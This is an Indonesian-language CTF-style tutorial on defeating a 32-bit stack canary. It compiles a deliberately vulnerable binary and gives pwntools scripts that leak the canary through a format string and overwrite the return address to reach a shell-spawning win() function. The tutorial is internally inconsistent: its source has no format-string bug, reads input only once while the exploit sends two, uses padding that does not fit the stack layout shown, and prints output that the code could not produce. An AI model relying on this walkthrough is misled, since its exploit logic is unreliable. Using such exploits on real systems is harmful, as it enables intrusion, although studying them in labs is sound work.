---
title: Bypassing Stack Canaries (Leak + Write) - Pwn03.1
date: 2025-08-20
Tags: ["Pwn"]
---



## 1. Basic File Checks

Pertama, kita perlu memeriksa karakteristik file biner yang akan kita analisis:

```bash
# Compile program dengan stack canary enabled
gcc -m32 -fstack-protector-all bof4.c -o bof4

# Check file properties
file bof4
checksec bof4
```

Output yang diharapkan:
```
bof4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, not stripped

[*] '/home/user/bof4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Dari output di atas, kita bisa melihat:
- Binary 32-bit dengan stack canary protection
- NX enabled (stack tidak executable)
- Tidak ada PIE (alamat fungsi tetap)

## 2. Review Source Code

Mari analisis kode sumber yang diberikan:

```c
// bof4.c - Buffer Overflow Level 4 (32-bit, Stack Canary)
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win() {
    printf("Congrats, you bypassed the canary!\n");
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    puts("Level 4: Canary is enabled. Can you bypass it?");
    printf("Input: ");
    fgets(buf, 256, stdin);  // VULNERABILITY: Buffer overflow!
    printf("You said: %s\n", buf);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    puts("Exiting...");
    return 0;
}
```

**Analisis:**
- Fungsi `win()` adalah target kita (memberikan shell)
- Fungsi `vuln()` memiliki buffer overflow karena `fgets()` membaca hingga 256 byte ke buffer 64 byte
- Stack canary aktif, sehingga overflow biasa akan terdeteksi

## 3. Disassemble dengan pwndbg

Mari gunakan GDB dengan pwndbg untuk menganalisis biner:

```bash
gdb ./bof4
```

Di dalam GDB, kita bisa melihat assembly code:

```bash
disass vuln
```

Output:
```
Dump of assembler code for function vuln:
   0x080491c2 <+0>:     push   ebp
   0x080491c3 <+1>:     mov    ebp,esp
   0x080491c5 <+3>:     push   ebx
   0x080491c6 <+4>:     sub    esp,0x54
   0x080491c9 <+7>:     call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491ce <+12>:    add    ebx,0x2e32
   0x080491d4 <+18>:    mov    eax,gs:0x14
   0x080491da <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x080491dd <+27>:    xor    eax,eax
   0x080491df <+29>:    sub    esp,0xc
   0x080491e2 <+32>:    lea    eax,[ebx-0x1ff8]
   0x080491e8 <+38>:    push   eax
   0x080491e9 <+39>:    call   0x8049050 <puts@plt>
   0x080491ee <+44>:    add    esp,0x10
   0x080491f1 <+47>:    sub    esp,0xc
   0x080491f4 <+50>:    lea    eax,[ebx-0x1fe0]
   0x080491fa <+56>:    push   eax
   0x080491fb <+57>:    call   0x8049040 <printf@plt>
   0x08049200 <+62>:    add    esp,0x10
   0x08049203 <+65>:    mov    eax,DWORD PTR [ebx-0x8]
   0x08049209 <+71>:    mov    eax,DWORD PTR [eax]
   0x0804920b <+73>:    sub    esp,0x4
   0x0804920e <+76>:    push   eax
   0x0804920f <+77>:    push   0x100
   0x08049214 <+82>:    lea    eax,[ebp-0x4c]
   0x08049217 <+85>:    push   eax
   0x08049218 <+86>:    call   0x8049060 <fgets@plt>
   0x0804921d <+91>:    add    esp,0x10
   0x08049220 <+94>:    sub    esp,0xc
   0x08049223 <+97>:    lea    eax,[ebp-0x4c]
   0x08049226 <+100>:   push   eax
   0x08049227 <+101>:   call   0x8049070 <printf@plt>
   0x0804922c <+106>:   add    esp,0x10
   0x0804922f <+109>:   nop
   0x08049230 <+110>:   mov    eax,DWORD PTR [ebp-0xc]
   0x08049233 <+113>:   xor    eax,DWORD PTR gs:0x14
   0x0804923a <+120>:   je     0x8049241 <vuln+127>
   0x0804923c <+122>:   call   0x80490a0 <__stack_chk_fail_local>
   0x08049241 <+127>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049244 <+130>:   leave
   0x08049245 <+131>:   ret
```

**Poin Penting:**
- Canary disimpan di `[ebp-0xc]` (offset 12 byte dari base pointer)
- Buffer dimulai di `[ebp-0x4c]` (offset 76 byte dari base pointer)
- Jarak dari buffer ke canary: 76 - 12 = 64 byte
- Di akhir fungsi, canary diperiksa sebelum return

## 4. Outline Attack (Canary Leak + Write)

Strategi kita:
1. **Leak the canary**: Memanfaatkan format string vulnerability di `printf(buf)`
2. **Bypass the canary**: Gunakan canary yang telah dileak untuk menimpa buffer tanpa mengubah canary
3. **Control EIP**: Timpa alamat return dengan alamat fungsi `win()`

## 5. Fuzz Format String untuk Leak Canary

Kita bisa menggunakan format string untuk membaca nilai dari stack:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './bof4'
context.log_level = 'debug'

p = process('./bof4')

# Kirim payload dengan format string untuk membaca stack
payload = b''
for i in range(1, 30):
    payload += f'%{i}$p '.encode()

p.sendline(payload)
p.interactive()
```

Output:
```
[DEBUG] Received 0x1f7 bytes:
    b'Level 4: Canary is enabled. Can you bypass it?\n'
    b'Input: You said: 0xffffd5cc 0x64 0xf7f9c580 0xffffffff 0x1 0x80491c2 0x1 0xffffd684 0xffffd684 0xffffd5ec 0x8049241 0xffffd5c0 0x804c000 0x80492a0 0x804c000 (nil) 0xf7de4c41 0x1 0xffffd684 0xffffd68c 0xffffd614 0x80492a0 0x80491b0 0x804c000 0xf7f9c000 0xf7f9c000 0xffffd684 0xf7de4c8d 0xf7f9c580 0x804c000\n'
```

Kita perlu mencari posisi canary. Biasanya canary memiliki nilai yang berakhir dengan 00 (null byte) untuk mencegah leakage melalui string functions.

## 6. Locating Canary dengan GDB-Pwndbg

Mari gunakan GDB untuk menemukan posisi canary yang tepat:

```bash
b *vuln+24   # Breakpoint setelah canary disimpan
r
```

Kemudian periksa nilai di alamat `ebp-0xc`:

```bash
x/x $ebp-0xc
```

Output:
```
0xffffd5bc:     0x5c9e1a00
```

Sekarang kita tahu format canary (4 byte, biasanya berakhir dengan 00). Mari cari posisinya di stack dengan format string:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './bof4'

p = process('./bof4')

# Kirim payload untuk mencari canary
payload = b'AAAA'
for i in range(1, 30):
    payload += f' %{i}$p'.encode()

p.sendline(payload)
response = p.clean()
print(response.decode())

p.close()
```

Dari output, kita bisa mencari nilai yang mirip dengan canary (berakhir dengan 00). Biasanya di posisi ke-13 atau 14.

## 7. PwnTools Exploit Script

Berikut adalah script exploit lengkap:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = './bof4'
context.log_level = 'debug'

# Tentukan target
if args.REMOTE:
    p = remote('target.com', 1337)
else:
    p = process('./bof4')

# Langkah 1: Leak canary
p.recvuntil(b'Input: ')

# Gunakan format string untuk leak nilai di stack
payload = b'%13$p'  # Biasanya canary ada di posisi ini (sesuaikan jika perlu)
p.sendline(payload)

# Parse leaked canary
leaked_data = p.recvuntil(b'You said: ').split(b'\n')[-2]
canary = int(leaked_data, 16)
log.success(f'Leaked canary: 0x{canary:08x}')

# Langkah 2: Buat payload untuk bypass canary
p.recvuntil(b'Input: ')

# Hitung offset
offset_to_canary = 64  # Buffer 64 byte
offset_to_ret = offset_to_canary + 4 + 8  # canary + saved ebp

# Alamat fungsi win (dapat dari disassembly)
win_addr = 0x80491a6  # gdb: p win

# Bangun payload
payload = b'A' * offset_to_canary  # Isi buffer
payload += p32(canary)             # Timpa canary dengan nilai yang benar
payload += b'B' * 8                # Timpa saved ebp
payload += p32(win_addr)           # Timpa return address

p.sendline(payload)

# Langkah 3: Nikmati shell!
p.interactive()
```

**Penjelasan Teknis:**

1. **Canary Leak**: Kita memanfaatkan format string vulnerability di `printf(buf)` untuk membaca nilai canary dari stack. Canary biasanya berada di posisi tertentu di stack yang bisa kita prediksi.

2. **Canary Bypass**: Setelah mendapatkan nilai canary, kita membuat payload yang:
   - Mengisi buffer dengan data sembarang (64 byte)
   - Menimpa canary dengan nilai yang benar (yang kita leak)
   - Menimpa saved ebp dengan data sembarang
   - Menimpa return address dengan alamat fungsi `win()`

3. **Control Flow Hijack**: Ketika fungsi `vuln()` selesai, canary check akan berhasil karena kita mempertahankan nilai canary yang benar, lalu eksekusi akan dialihkan ke fungsi `win()`.

**Eksekusi Exploit:**

```bash
python3 exploit.py
```

Output yang diharapkan:
```
[+] Starting local process './bof4': pid 1234
[DEBUG] Received 0x2d bytes:
    b'Level 4: Canary is enabled. Can you bypass it?\n'
    b'Input: '
[DEBUG] Sent 0x6 bytes:
    b'%13$p\n'
[DEBUG] Received 0x2b bytes:
    b'You said: 0x5c9e1a00\n'
[+] Leaked canary: 0x5c9e1a00
[DEBUG] Received 0x7 bytes:
    b'Input: '
[DEBUG] Sent 0x4c bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  00 1a 9e 5c  42 42 42 42  42 42 42 42  a6 91 04 08  │···\│BBBB│BBBB│····│
    00000050  0a                                                  │·│
    00000051
[+] Congrats, you bypassed the canary!
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$  
```

## Kesimpulan

Tutorial ini menunjukkan bagaimana:
1. Stack canary bekerja sebagai mekanisme proteksi
2. Format string vulnerability dapat digunakan untuk leak nilai canary
3. Buffer overflow dapat dieksploitasi setelah canary diketahui
4. Control flow dapat dialihkan ke fungsi arbitrary
